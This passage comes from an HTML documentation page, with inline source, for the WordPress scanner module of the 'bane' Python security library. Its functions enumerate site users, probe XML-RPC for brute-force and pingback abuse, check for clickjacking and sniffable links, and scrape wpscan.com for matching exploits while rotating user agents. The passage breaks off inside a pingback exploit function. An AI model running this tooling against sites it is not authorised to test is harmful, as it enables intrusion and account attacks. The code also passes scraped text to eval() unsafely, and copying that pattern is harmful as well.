            print(&#39;[i] Theme: {} | Version: {}\n&#39;.format(x[&#39;name&#39;],x[&#39;version&#39;]))
        x[&#39;exploits&#39;]=fetch_wp_exploits(x,max_tries=max_wpscan_tries,proxy=proxy,user_agent=user_agent,timeout=timeout,cookie=wpscan_cookie,sleep_time_min=sleep_time_min,sleep_time_max=sleep_time_max,when_blocked_sleep=when_blocked_sleep)
        if logs==True:
            for i in x[&#39;exploits&#39;]:
                print(&#34;\tTitle: {}\n\tLink: {}&#34;.format(i[&#39;title&#39;],i[&#39;exploit_url&#39;]))
                print()
    if len(plugins)&gt;0:
        if logs==True:
            print()
            print(&#39;[i] looking for exploits for the plugins:\n&#39;)
    for x in plugins:
        if logs==True:
            print(&#39;[i] Plugin: {} | Version: {}\n&#39;.format(x[&#39;name&#39;],x[&#39;version&#39;]))
        x[&#39;exploits&#39;]=fetch_wp_exploits(x,max_tries=max_wpscan_tries,proxy=proxy,user_agent=user_agent,timeout=timeout,cookie=wpscan_cookie,sleep_time_min=sleep_time_min,sleep_time_max=sleep_time_max,when_blocked_sleep=when_blocked_sleep)
        if logs==True:
            for i in x[&#39;exploits&#39;]:
                print(&#34;\tTitle: {}\n\tLink: {}&#34;.format(i[&#39;title&#39;],i[&#39;exploit_url&#39;]))
                print()
    return {&#39;url&#39;:u,&#39;domain&#39;:domain,&#39;ip&#39;:ip,&#39;root_domain&#39;:root_domain,&#39;sub_domains&#39;:subs,&#39;server&#39;:server,&#39;os&#39;:server_os,&#39;backend_technology&#39;:backend,&#39;wordpress_version&#39;:wp_version,&#39;sniffable_links&#39;:media_non_ssl,&#39;clickjackable&#39;:clickj,&#39;themes&#39;:themes,&#39;plugins&#39;:plugins,&#39;users_json_exposed&#39;:users_json_exposed,&#39;exopsed_json_users&#39;:{&#39;users&#39;:json_users,&#39;path&#39;:json_path},&#39;can_enumerate_users&#39;:can_enumerate_users,&#39;enumerated_users&#39;:enumerated_users,&#39;enabled_xmlrpc_methods&#39;:xmlrpcs,&#34;xmlrpc_bruteforce_users&#34;:can_b_u,&#34;pingback_enabled&#34;:can_pb,&#34;exploits&#34;:wp_vulns,&#39;backend_technology_exploits&#39;:backend_technology_exploits,&#39;server_exploits&#39;:server_exploits}</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-functions">Functions</h2>
<dl>
<dt id="bane.scanners.cms.wp.extract_with_versions"><code class="name flex">
<span>def <span class="ident">extract_with_versions</span></span>(<span>cve_list, software_version)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def extract_with_versions(cve_list,software_version):
    results = []
    for cve in cve_list:
        title = cve[&#39;title&#39;]
        try:
            version = [ x.strip() for x in title.split() if &#39;.&#39; in x and x.endswith(&#39;.&#39;)==False and x.startswith(&#39;.&#39;)==False][0]
        except:
            version=&#39;&#39;
        if version!=&#39;&#39;:
            try:
                c=title.split(version)[0].split()
                if c[-1].strip()==&#39;&lt;&#39;:
                    comparison=&#39;&lt;&#39;
                elif c[-1].strip()==&#39;&gt;&#39;:
                    comparison=&#39;&gt;&#39;
                elif c[-1].strip()==&#39;&lt;=&#39;:
                    comparison=&#39;&lt;=&#39;
                else:
                    comparison=&#39;==&#39;
            except:
                comparison=&#39;==&#39;
        if version==&#39;&#39;:
            version=software_version
        if &#39;-&#39; not in version:
            if eval(&#39;{}{}{}&#39;.format(version_string_to_list(software_version),comparison,version_string_to_list(version)))==True:
                results.append(cve)
        else:
            if eval(&#39;{}&gt;{} and {}&lt;{}&#39;.format(version_string_to_list(software_version),version_string_to_list(version.split(&#39;-&#39;)[0].strip()),version_string_to_list(software_version),version_string_to_list(version.split(&#39;-&#39;)[1].strip())))==True:
                results.append(cve)
    return results</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.fetch_wp_exploits"><code class="name flex">
<span>def <span class="ident">fetch_wp_exploits</span></span>(<span>s, max_tries=3, proxy=None, user_agent=None, timeout=15, cookie=None, sleep_time_min=10, sleep_time_max=20, when_blocked_sleep=30)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def fetch_wp_exploits(s,max_tries=3,proxy=None,user_agent=None,timeout=15,cookie=None,sleep_time_min=10,sleep_time_max=20,when_blocked_sleep=30):
    if s[&#39;version&#39;].strip()==&#39;&#39;:
        return []
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    i=1
    l=[]
    result=[]
    tries=0
    while True:
        tries+=1
        #print(tries)
        if tries==max_tries:
            break
        try:
            r=requests.Session().get(&#39;https://wpscan.com/search?page={}&amp;text={}&#39;.format(i,s[&#39;name&#39;]),headers=hed,timeout=timeout,proxies=proxy,verify=False).text
            #print(r)
            data=json.loads(r.split(&#39;&#34;pageData&#34;:{&#34;props&#34;:{&#34;data&#34;:&#39;)[1].split(&#39;,&#34;metadata&#34;:{&#34;pageCount&#34;:&#39;)[0])
            if len(data)==0:
                break
            l+=data
            i+=1
            tries=0
        except Exception as ex:
            #raise(ex)
            time.sleep(when_blocked_sleep)
        time.sleep(random.randint(sleep_time_min,sleep_time_max))
    for x in l:
        x[&#39;exploit_url&#39;]=&#39;https://wpscan.com/vulnerability/&#39;+x[&#39;id&#39;]
    return extract_with_versions(l,s[&#39;version&#39;])</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.get_wp_infos"><code class="name flex">
<span>def <span class="ident">get_wp_infos</span></span>(<span>u, max_wpscan_tries=3, cookie=None, user_agent=None, timeout=15, proxy=None, user_enum_start=1, user_enum_end=20, wpscan_cookie=None, sleep_time_min=10, sleep_time_max=20, when_blocked_sleep=30, logs=True, crt_timeout=120, wayback_timeout=120, subdomain_check_timeout=10, max_wayback_urls=10, subdomains_only=True, headers={}, api_key=None)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def get_wp_infos(u,max_wpscan_tries=3,cookie=None,user_agent=None,timeout=15,proxy=None,user_enum_start=1,user_enum_end=20,wpscan_cookie=None,sleep_time_min=10,sleep_time_max=20,when_blocked_sleep=30,logs=True,crt_timeout=120,wayback_timeout=120,subdomain_check_timeout=10,max_wayback_urls=10,subdomains_only=True,headers={},api_key=None):
    domain=u.split(&#39;://&#39;)[1].split(&#39;/&#39;)[0].split(&#39;:&#39;)[0]
    root_domain=extract_root_domain(domain)
    ip=socket.gethostbyname(domain.split(&#39;:&#39;)[0])
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    response = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
    server=response.headers.get(&#39;Server&#39;,&#39;&#39;)
    try:
        server_os=[x for x in server.split() if x.startswith(&#39;(&#39;)==True][0].replace(&#39;(&#39;,&#39;&#39;).replace(&#39;)&#39;,&#39;&#39;)
    except:
        server_os=&#39;&#39;
    backend=response.headers.get(&#39;X-Powered-By&#39;,&#39;&#39;)
    html_content = response.text

    # Parse the HTML content
    soup = BeautifulSoup(html_content, &#39;html.parser&#39;)

    # Find themes and plugins information
    themes = []
    plugins = []
    try:
        #print(response.split(&#39;&lt;meta name=&#34;generator&#34; content=&#34;&#39;)[1].split(&#39;&#34;&#39;)[0])
        wp_version=response.text.lower().split(&#39;&lt;meta name=&#34;generator&#34; content=&#34;wordpress&#39;)[1].split(&#39;&#34;&#39;)[0].strip()
    except Exception as ex:
        #raise(ex)
        wp_version=&#39;&#39;
    # Extract themes
    if logs==True:
        print(&#34;WordPress site info:\n\n\tURL: {}\n\tDomain: {}\n\tIP: {}\n\tServer: {}\n\tOS: {}\n\tBackend technology: {}\n\tWordPress version: {}\n&#34;.format(u,domain,ip,server,server_os,backend,wp_version))
    clickj=page_clickjacking(u,request_headers=response.headers)
    if logs==True:
        print(&#34;[i] Looking for subdomains...&#34;)
    subs=get_subdomains(root_domain,logs=logs, crt_timeout=crt_timeout,user_agent=user_agent,cookie=cookie,wayback_timeout=wayback_timeout,subdomain_check_timeout=subdomain_check_timeout,max_wayback_urls=max_wayback_urls,proxy=proxy,subdomains_only=subdomains_only)
    if logs==True:
        print(&#34;[i] Cheking if we can sniff some cookies over some links...&#34;)
        print()
    media_non_ssl=sniffable_links(u,content=response.text,logs=logs,request_headers=response.headers)
    if logs==True:
        print()
    theme_links = soup.find_all(&#39;link&#39;, rel=&#39;stylesheet&#39;)
    for link in theme_links:
        href = link.get(&#39;href&#39;)
        #print(href)
        if &#39;themes&#39; in href:
            try:
                theme_name = href.split(&#39;/themes/&#39;)[1].split(&#39;/&#39;)[0]
                try:
                    version=href.split(&#39;?&#39;)[1].split(&#39;=&#39;)[1]
                except:
                    version=&#39;&#39;
                theme={&#39;name&#39;:theme_name,&#39;version&#39;:version}
                if theme not in themes:
                    themes.append(theme)
            except:
                pass
        elif &#39;plugins&#39; in href:
            try:
                plugin_name = href.split(&#39;/plugins/&#39;)[1].split(&#39;/&#39;)[0]
                try:
                    version=href.split(&#39;?&#39;)[1].split(&#39;=&#39;)[1]
                except:
                    version=&#39;&#39;
                plugin={&#39;name&#39;:plugin_name,&#39;version&#39;:version}
                if plugin not in plugins:
                    plugins.append(plugin)
            except:
                pass
    users_json_exposed=True
    json_path=u+&#39;/wp-json/wp/v2/users&#39;
    if logs==True:
        print(&#39;[i] Fetching users from: {}&#39;.format(json_path))
    json_users=wp_users(u,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,headers=headers)
    if logs==True:
        for x in json_users:
            print(&#39;\t[+] id: {} | name: {} | slug: {}&#39;.format(x[&#39;id&#39;],x[&#39;name&#39;],x[&#39;slug&#39;]))
        print()
    if json_users==[]:
        users_json_exposed=False
    can_enumerate_users=True
    if logs==True:
        print(&#39;[i] Trying enumerating the authors...&#39;)
    enumerated_users= wp_users_enumeration(u,logs=logs,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,start=user_enum_start,end=user_enum_end,headers=headers)
    if enumerated_users==[]:
        can_enumerate_users=False
    else:
        if logs==True:
            print()
            for x in enumerated_users:
                print(&#39;\t[+] id: {} | name: {} | slug: {}&#39;.format(x[&#39;id&#39;],x[&#39;name&#39;],x[&#39;slug&#39;]))
    if logs==True:
        print()
        print(&#39;[i] Checking if XMLRPC is enabled from: {}&#39;.format(u+&#39;/xmlrpc.php&#39;))
    xmlrpcs=wp_xmlrpc_methods(u,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=proxy,headers=headers)
    can_b_u=(&#34;wp.getUsersBlogs&#34; in xmlrpcs) and (&#34;system.multicall&#34; in xmlrpcs)
    can_pb=&#34;pingback.ping&#34; in xmlrpcs
    if logs==True:
        if len(xmlrpcs)&gt;0:
            print(&#39;[+] enabled&#39;)
            if can_b_u==True:
                print(&#39;\t[+] Vulnerable to users bruteforce&#39;)
            if can_pb==True:
                print(&#39;\t[+] Vulnerable to pingback&#39;)
        else:
            print(&#39;\t[-] disabled&#39;)
        print()
    wp_vulns=[]
    if wp_version!=&#39;&#39;:
        if logs==True:
            print(&#39;[i] looking for exploits for version: {}\n&#39;.format(wp_version))
        wpvulns=vulners_search(&#39;wordpress&#39;,version=wp_version,proxy=proxy,api_key=api_key)
        for x in wpvulns:
            if &#39;wordpress&#39; in x[&#39;title&#39;].lower() or &#39;wordpress&#39; in x[&#39;description&#39;].lower():
                wp_vulns.append(x)
        for x in wp_vulns:
            for i in [&#39;cpe&#39;, &#39;cpe23&#39;, &#39;cwe&#39;, &#39;affectedSoftware&#39;]:
                try:
                    del x[i]
                except:
                    pass
        if logs==True:
            if len(wp_vulns)==0:
                print(&#39;\t[-] none was found&#39;)
            else:
                for x in wp_vulns:
                    print(&#34;\tTitle : {}\n\tDescription: {}\n\tLink: {}&#34;.format(x[&#39;title&#39;],x[&#39;description&#39;],x[&#39;href&#39;]))
                    print()
    backend_technology_exploits={}
    if backend!=&#39;&#39;:
        bk=[]
        for back in backend.split():
            if logs==True:
                print(&#39;[i] looking for exploits for : {}\n&#39;.format(back))
            if &#39;/&#39; not in back:
                if logs==True:
                    print(&#39;\t[-] unknown version\n&#39;)
            else:
                bk=vulners_search(back.split(&#39;/&#39;)[0].lower(),version=back.split(&#39;/&#39;)[1],proxy=proxy,api_key=api_key)
            for x in bk:
                for i in [&#39;cpe&#39;, &#39;cpe23&#39;, &#39;cwe&#39;, &#39;affectedSoftware&#39;]:
                    try:
                        del x[i]
                    except:
                        pass
            backend_technology_exploits.update({back:bk})
            if logs==True:
                if len(bk)==0:
                    print(&#39;\t[-] none was found&#39;)
                else:
                    for x in bk:
                        print(&#34;\tTitle : {}\n\tDescription: {}\n\tLink: {}&#34;.format(x[&#39;title&#39;],x[&#39;description&#39;],x[&#39;href&#39;]))
                        print()
    server_exploits={}
    if server!=&#39;&#39;:
        for sv in server.split():
            if sv.startswith(&#39;(&#39;)==False:
                sv_e=[]
                if logs==True:
                    print(&#39;[i] looking for exploits for : {}\n&#39;.format(sv))
                if &#39;/&#39; in sv:
                    sv_e=vulners_search(sv.split(&#39;/&#39;)[0].lower(),version=sv.split(&#39;/&#39;)[1],proxy=proxy,api_key=api_key)
                else:
                    if logs==True:
                        print(&#39;\t[-] unknown version\n&#39;)
                for x in sv_e:
                    for i in [&#39;cpe&#39;, &#39;cpe23&#39;, &#39;cwe&#39;, &#39;affectedSoftware&#39;]:
                        try:
                            del x[i]
                        except:
                            pass
                server_exploits.update({sv:sv_e})
                if logs==True:
                    if len(sv_e)==0:
                        print(&#39;\t[-] none was found&#39;)
                    else:
                        for x in sv_e:
                            print(&#34;\tTitle : {}\n\tDescription: {}\n\tLink: {}&#34;.format(x[&#39;title&#39;],x[&#39;description&#39;],x[&#39;href&#39;]))
                            print()
    if len(themes)&gt;0:
        if logs==True:
            print(&#39;[i] looking for exploits for the themes:\n&#39;)
    for x in themes:
        if logs==True:
            print(&#39;[i] Theme: {} | Version: {}\n&#39;.format(x[&#39;name&#39;],x[&#39;version&#39;]))
        x[&#39;exploits&#39;]=fetch_wp_exploits(x,max_tries=max_wpscan_tries,proxy=proxy,user_agent=user_agent,timeout=timeout,cookie=wpscan_cookie,sleep_time_min=sleep_time_min,sleep_time_max=sleep_time_max,when_blocked_sleep=when_blocked_sleep)
        if logs==True:
            for i in x[&#39;exploits&#39;]:
                print(&#34;\tTitle: {}\n\tLink: {}&#34;.format(i[&#39;title&#39;],i[&#39;exploit_url&#39;]))
                print()
    if len(plugins)&gt;0:
        if logs==True:
            print()
            print(&#39;[i] looking for exploits for the plugins:\n&#39;)
    for x in plugins:
        if logs==True:
            print(&#39;[i] Plugin: {} | Version: {}\n&#39;.format(x[&#39;name&#39;],x[&#39;version&#39;]))
        x[&#39;exploits&#39;]=fetch_wp_exploits(x,max_tries=max_wpscan_tries,proxy=proxy,user_agent=user_agent,timeout=timeout,cookie=wpscan_cookie,sleep_time_min=sleep_time_min,sleep_time_max=sleep_time_max,when_blocked_sleep=when_blocked_sleep)
        if logs==True:
            for i in x[&#39;exploits&#39;]:
                print(&#34;\tTitle: {}\n\tLink: {}&#34;.format(i[&#39;title&#39;],i[&#39;exploit_url&#39;]))
                print()
    return {&#39;url&#39;:u,&#39;domain&#39;:domain,&#39;ip&#39;:ip,&#39;root_domain&#39;:root_domain,&#39;sub_domains&#39;:subs,&#39;server&#39;:server,&#39;os&#39;:server_os,&#39;backend_technology&#39;:backend,&#39;wordpress_version&#39;:wp_version,&#39;sniffable_links&#39;:media_non_ssl,&#39;clickjackable&#39;:clickj,&#39;themes&#39;:themes,&#39;plugins&#39;:plugins,&#39;users_json_exposed&#39;:users_json_exposed,&#39;exopsed_json_users&#39;:{&#39;users&#39;:json_users,&#39;path&#39;:json_path},&#39;can_enumerate_users&#39;:can_enumerate_users,&#39;enumerated_users&#39;:enumerated_users,&#39;enabled_xmlrpc_methods&#39;:xmlrpcs,&#34;xmlrpc_bruteforce_users&#34;:can_b_u,&#34;pingback_enabled&#34;:can_pb,&#34;exploits&#34;:wp_vulns,&#39;backend_technology_exploits&#39;:backend_technology_exploits,&#39;server_exploits&#39;:server_exploits}</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.version_string_to_list"><code class="name flex">
<span>def <span class="ident">version_string_to_list</span></span>(<span>version)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def version_string_to_list(version):
    return [int(x) for x in version.split(&#39;.&#39;)]</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_user"><code class="name flex">
<span>def <span class="ident">wp_user</span></span>(<span>u, path='/wp-json/wp/v2/users/', user=1, user_agent=None, cookie=None, timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"><p>this function is to return all informations about a WP user with a given index integer</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_user(
    u,
    path=&#34;/wp-json/wp/v2/users/&#34;,
    user=1,
    user_agent=None,
    cookie=None,
    timeout=10,
    proxy=None,
    headers={}
):
    &#34;&#34;&#34;
    this function is to return all informations about a WP user with a given index integer&#34;&#34;&#34;
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    hed.update(headers)
    u += path + str(user)
    try:
        r = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
        if (&#39;{&#34;id&#34;:&#39; in r.text) and (&#39;&#34;name&#34;:&#34;&#39; in r.text):
            return json.loads(r.text)
    except Exception as e:
        pass</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_users"><code class="name flex">
<span>def <span class="ident">wp_users</span></span>(<span>u, path='/wp-json/wp/v2/users', timeout=10, user_agent=None, cookie=None, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"><p>this function is to get WP users</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_users(
    u, path=&#34;/wp-json/wp/v2/users&#34;, timeout=10, user_agent=None, cookie=None, proxy=None, headers={}
):
    &#34;&#34;&#34;
    this function is to get WP users&#34;&#34;&#34;
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    u += path
    try:
        r = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
        if (&#39;{&#34;id&#34;:&#39; in r.text) and (&#39;&#34;name&#34;:&#34;&#39; in r.text):
            a = json.loads(r.text)
            users = []
            for x in range(len(a)):
                users.append(
                    {&#34;id&#34;: a[x][&#34;id&#34;], &#34;slug&#34;: a[x][&#34;slug&#34;], &#34;name&#34;: a[x][&#34;name&#34;]}
                )
            return users
    except Exception as e:
        return []
    return []</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_users_enumeration"><code class="name flex">
<span>def <span class="ident">wp_users_enumeration</span></span>(<span>u, path='/', timeout=15, user_agent=None, cookie=None, proxy=None, start=1, end=20, logs=True, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_users_enumeration(
    u,
    path=&#34;/&#34;,
    timeout=15,
    user_agent=None,
    cookie=None,
    proxy=None,
    start=1,
    end=20,
    logs=True,
    headers={}
):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    d = u.split(&#34;://&#34;)[1].split(&#34;/&#34;)[0]
    u = u.split(d)[0] + d
    l = []
    for x in range(start, end + 1):
        try:
            r = requests.Session().get(
                u + path + &#34;?author=&#34; + str(x),
                headers=hed,
                proxies=proxy,
                timeout=timeout,
                verify=False,
            ).text
            a = r.split(&#39;&lt;meta property=&#34;og:title&#34; content=&#34;&#39;)[1].split(&#34;&gt;&#34;)[0]
            b=r.split(&#39;&lt;meta property=&#34;og:url&#34; content=&#34;&#39;)[1].split(&#34;&gt;&#34;)[0]
            c=b.split(&#39;/author/&#39;)[1].split(&#39;/&#39;)[0]
            if &#34;,&#34; in a:
                a = a.split(&#34;,&#34;)[0]
                l.append({&#39;id&#39;:x, &#39;name&#39;:a,&#39;slug&#39;:c})
                if logs == True:
                    print(
                        &#34;\t[+] id: {} | name: {} | slug: {}&#34;.format(
                            x,#.encode(&#34;utf-8&#34;, &#34;replace&#34;), 
                            a,
                            c
                        )
                    )
        except KeyboardInterrupt:
            break
        except:
            pass
    return l</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_version"><code class="name flex">
<span>def <span class="ident">wp_version</span></span>(<span>u, timeout=15, user_agent=None, cookie=None, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_version(u, timeout=15, user_agent=None, cookie=None, proxy=None,headers={}):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    try:
        r = requests.Session().get(
            u, headers=hed, proxies=proxy, timeout=timeout, verify=False
        ).text
        return (
            r.split(&#39;&lt;meta name=&#34;generator&#34; content=&#34;&#39;)[1]
            .split(&#39;&#34;&#39;)[0]
            .strip()
            .split(&#34; &#34;)[1]
        )
    except:
        pass</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_xmlrpc_bruteforce"><code class="name flex">
<span>def <span class="ident">wp_xmlrpc_bruteforce</span></span>(<span>u, user_agent=None, cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_xmlrpc_bruteforce(
    u, user_agent=None, cookie=None, path=&#34;/xmlrpc.php&#34;, timeout=10, proxy=None,headers={}
):
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    u += path
    post = &#34;&#34;&#34;
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
&#34;&#34;&#34;
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        if &#34;wp.getUsersBlogs&#34; in [
            x.replace(&#34;&lt;/string&gt;&lt;/value&gt;&#34;, &#34;&#34;).replace(&#34;&lt;value&gt;&lt;string&gt;&#34;, &#34;&#34;).strip()
            for x in r.text.split(&#34;&lt;data&gt;&#34;)[1].split(&#34;&lt;/data&gt;&#34;)[0].strip().split(&#34;\n&#34;)
        ]:
            return True
    except:
        pass
    return False</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_xmlrpc_mass_bruteforce"><code class="name flex">
<span>def <span class="ident">wp_xmlrpc_mass_bruteforce</span></span>(<span>u, user_agent=None, cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_xmlrpc_mass_bruteforce(
    u, user_agent=None, cookie=None, path=&#34;/xmlrpc.php&#34;, timeout=10, proxy=None, headers={}
):
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    u += path
    post = &#34;&#34;&#34;
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
&#34;&#34;&#34;
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = [
            x.replace(&#34;&lt;/string&gt;&lt;/value&gt;&#34;, &#34;&#34;).replace(&#34;&lt;value&gt;&lt;string&gt;&#34;, &#34;&#34;).strip()
            for x in r.text.split(&#34;&lt;data&gt;&#34;)[1].split(&#34;&lt;/data&gt;&#34;)[0].strip().split(&#34;\n&#34;)
        ]
        if (&#34;wp.getUsersBlogs&#34; in l) and (&#34;system.multicall&#34; in l):
            return True
    except:
        pass
    return False</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_xmlrpc_methods"><code class="name flex">
<span>def <span class="ident">wp_xmlrpc_methods</span></span>(<span>u, user_agent=None, cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_xmlrpc_methods(
    u, user_agent=None, cookie=None, path=&#34;/xmlrpc.php&#34;, timeout=10, proxy=None,headers={}
):
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    u += path
    post = &#34;&#34;&#34;
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
&#34;&#34;&#34;
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        return [
            x.replace(&#34;&lt;/string&gt;&lt;/value&gt;&#34;, &#34;&#34;).replace(&#34;&lt;value&gt;&lt;string&gt;&#34;, &#34;&#34;).strip()
            for x in r.text.split(&#34;&lt;data&gt;&#34;)[1].split(&#34;&lt;/data&gt;&#34;)[0].strip().split(&#34;\n&#34;)
        ]
    except:
        pass
    return []</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_xmlrpc_pingback"><code class="name flex">
<span>def <span class="ident">wp_xmlrpc_pingback</span></span>(<span>u, user_agent=None, test_url='https://www.google.com/', cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_xmlrpc_pingback(
    u,
    user_agent=None,
    test_url=&#34;https://www.google.com/&#34;,
    cookie=None,
    path=&#34;/xmlrpc.php&#34;,
    timeout=10,
    proxy=None,
    headers={}
):
    if u[len(u) - 1] == &#34;/&#34;:
        u = u[0 : len(u) - 1]
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    u += path
    post = &#34;&#34;&#34;
 &lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; 
&lt;methodCall&gt; 
&lt;methodName&gt;system.listMethods&lt;/methodName&gt; 
&lt;params&gt;&lt;/params&gt; 
&lt;/methodCall&gt;
&#34;&#34;&#34;
    try:
        r = requests.Session().post(
            u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
        )
        l = [
            x.replace(&#34;&lt;/string&gt;&lt;/value&gt;&#34;, &#34;&#34;).replace(&#34;&lt;value&gt;&lt;string&gt;&#34;, &#34;&#34;).strip()
            for x in r.text.split(&#34;&lt;data&gt;&#34;)[1].split(&#34;&lt;/data&gt;&#34;)[0].strip().split(&#34;\n&#34;)
        ]
        if &#34;pingback.ping&#34; in l:
            return True
    except:
        pass
    return False</code></pre>
</details>
</dd>
<dt id="bane.scanners.cms.wp.wp_xmlrpc_pingback_exploit"><code class="name flex">
<span>def <span class="ident">wp_xmlrpc_pingback_exploit</span></span>(<span>u, user_agent=None, target_url='https://www.google.com/', cookie=None, path='/xmlrpc.php', timeout=10, proxy=None, headers={})</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def wp_xmlrpc_pingback_exploit(
    u,
    user_agent=None,
    target_url=&#34;https://www.google.com/&#34;,
    cookie=None,
    path=&#34;/xmlrpc.php&#34;,
    timeout=10,
    proxy=None,
    headers={}
):
    url = u.split(&#34;://&#34;)[0] + &#34;://&#34; + urlparse(u).netloc
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    hed = {&#34;User-Agent&#34;: us}
    if cookie:
        hed.update({&#34;Cookie&#34;: cookie})
    hed.update(headers)
    url += path
    post = (
        &#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
